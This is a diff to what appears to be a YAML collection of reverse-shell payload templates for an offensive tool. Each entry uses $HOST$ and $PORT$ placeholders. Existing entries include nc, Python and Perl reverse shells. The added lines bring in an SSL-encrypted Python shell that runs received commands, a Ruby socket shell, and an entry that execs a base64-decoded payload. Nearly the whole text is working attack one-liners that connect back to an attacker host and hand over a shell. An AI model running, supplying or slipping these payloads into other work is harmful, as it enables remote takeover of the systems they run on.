@@ -15,8 +15,16 @@ nc:
   e: nc -e "/bin/sh -i" $HOST$ $PORT$
 
 python:
+  # TODO
+  config:
+    base64: exec('$BASE64_PAYLOAD$'.decode('base64'))
+
   subproc: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$HOST$",$PORT$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   pty: python -c 'import socket, os, pty; s=socket.socket(); s.connect(("$HOST$", $PORT$)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
+  ssl: "python -c 'import socket, subprocess, os, ssl; so=socket.socket(socket.AF_INET,socket.SOCK_STREAM); so.connect((\"$HOST$\",$PORT$)); s=ssl.wrap_socket(so); QB=False; while not QB: data=s.recv(1024); if len(data)==0: QB = True; proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE); stdout_value=proc.stdout.read() + proc.stderr.read(); s.sendall(stdout_value)'"
+
+ruby:
+  socket: ruby -rsocket -e'f=TCPSocket.open("$HOST$",$PORT$).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 perl:
   connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton("$HOST$")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
